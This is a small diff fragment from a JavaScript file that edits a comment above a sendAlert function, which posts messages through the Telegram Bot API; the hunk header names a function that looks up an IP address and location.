@@ -34,7 +34,7 @@ async function getIPAndLocation() {
   }
 }
 
-// Send Telegram Message
+// Send Telegram Message dd
 function sendAlert(message) {
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
